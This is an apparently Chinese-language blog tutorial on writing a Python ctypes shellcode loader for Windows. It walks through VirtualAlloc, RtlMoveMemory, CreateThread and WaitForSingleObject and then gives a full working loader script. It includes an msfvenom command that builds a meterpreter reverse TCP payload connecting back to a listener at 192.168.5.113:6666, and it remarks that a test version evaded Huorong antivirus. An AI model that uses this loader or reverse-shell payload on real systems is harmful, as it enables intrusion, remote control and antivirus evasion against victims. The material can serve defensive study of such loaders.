@Author：Y4tacker

# python-shellcode加载器

主要是利用ctypes库来调用windows的api来完成加载shellcode的操作

## 流程

将shellcode加载进内存并执行

## 函数介绍

### VirtualAlloc

申请内存调用VirtualAlloc函数，来申请一块动态内存区域。VirtualAlloc函数原型和参数如下：

```c++
LPVOID VirtualAlloc{
LPVOID lpAddress, #要分配的内存区域的地址
DWORD dwSize,      #分配的大小
DWORD flAllocationType, #分配的类型
DWORD flProtect     #该内存的初始保护属性
};
```

python

```
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
ctypes.c_int(len(shellcode)), 
ctypes.c_int(0x3000),                                       
ctypes.c_int(0x40))
```

| ctypes.c_int(0)              | 是NULL，系统将会决定分配内存区域的位置，并且按64KB向上取整   |
| ---------------------------- | ------------------------------------------------------------ |
| ctypes.c_int(len(shellcode)) | 以字节为单位分配或者保留多大区域                             |
| ctypes.c_int(0x3000)         | 是 MEM_COMMIT(0x1000) 和 MEM_RESERVE(0x2000)类型的合并       |
| ctypes.c_int(0x40)           | 是权限为PAGE_EXECUTE_READWRITE 该区域可以执行代码，应用程序可以读写该区域。 |

### RtlMoveMemory

 调用RtlMoveMemory函数可以将shellcode载入内存，此函数从指定内存中复制内容至另一内存里。RtlMoveMemory函数原型和参数如下

```
RtlMoveMemory(Destination,Source,Length);
Destination ：指向移动目的地址的指针。
Source ：指向要复制的内存地址的指针。
Length ：指定要复制的字节数。
```

在python中

```python
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf, ctypes.c_int(len(shellcode)))
```

### CreateThread

 创建进程调用CreateThread将在主线程的基础上创建一个新线程CreateThread函数原型和参数如下：

```
HANDLE CreateThread(
LPSECURITY_ATTRIBUTES lpThreadAttributes,#线程安全属性
SIZE_T dwStackSize,       #置初始栈的大小，以字节为单位
LPTHREAD_START_ROUTINE lpStartAddress,  #指向线程函数的指针
LPVOID lpParameter,          #向线程函数传递的参数
DWORD dwCreationFlags,       #线程创建属性
LPDWORD lpThreadId           #保存新线程的id
)
```

在python

```python
handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_uint64(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0))
```

| lpThreadAttributes | 为NULL使用默认安全性                                         |
| ------------------ | ------------------------------------------------------------ |
| dwStackSize        | 为0，默认将使用与调用该函数的线程相同的栈空间大小            |
| lpStartAddress     | 为ctypes.c_uint64(ptr)，定位到申请的内存所在的位置           |
| lpParameter        | 不需传递参数时为NULL                                         |
| dwCreationFlags    | 属性为0，表示创建后立即激活                                  |
| lpThreadId         | 为ctypes.pointer(ctypes.c_int(0))不想返回线程ID,设置值为NULL |

### WaitForSingleObject

 等待线程结束调用WaitForSingleObject函数用来检测线程的状态WaitForSingleObject函数原型和参数

```c++
DWORD WINAPI WaitForSingleObject(
__in HANDLE hHandle,     #对象句柄。可以指定一系列的对象
__in DWORD dwMilliseconds  #定时时间间隔
);
```

在python里

```python
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

正常的话我们创建的线程是需要一直运行的，所以将时间设为负数，等待时间将成为无限等待，程序就不会结束

## 实战

首先用msf生成shellcode

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.5.113 lport=6666 -f py > 1.txt
```

之后

```

import ctypes

VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
CreateThread = ctypes.windll.kernel32.CreateThread
WaitForSingleObject = ctypes.windll.kernel32.WaitForSingleObject

#shellcode可以用msf来生成
buf = b""

shellcode = bytearray(buf)
VirtualAlloc.restype = ctypes.c_void_p  # 重载函数返回类型为void
p = VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), 0x3000, 0x00000040)  # 申请内存
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  # 将shellcode指向指针
RtlMoveMemory(ctypes.c_void_p(p), buf, ctypes.c_int(len(shellcode)))  # 复制shellcode进申请的内存中
h = CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_void_p(p), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))  # 执行创建线程
WaitForSingleObject(ctypes.c_int(h), ctypes.c_int(-1))  # 检测线程创建事件
```

至于如何免杀，还没详细体验过，反正这个弹出计算器的过了火绒